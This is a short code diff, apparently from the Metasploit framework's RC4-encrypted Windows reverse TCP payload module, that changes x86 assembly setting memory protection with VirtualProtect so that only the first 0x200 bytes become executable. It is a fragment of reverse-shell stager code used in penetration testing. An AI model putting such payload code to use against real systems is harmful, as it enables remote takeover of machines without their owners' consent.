@@ -189,9 +189,7 @@ module Payload::Windows::ReverseTcpRc4
           push 0               ; tmp var for holding old protect bits 
           push esp             ; push address of the tmp var
           push 0x20            ; PAGE_EXECUTE_READ
-          add ecx, 0x100       ; Add the size of scratch space
-          push ecx             ; stage length
-          sub ecx, 0x100
+          push 0x200           ; Make only the first 0x200 bytes executable
           push ebx             ; address of S-box
           push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualProtect')}
 
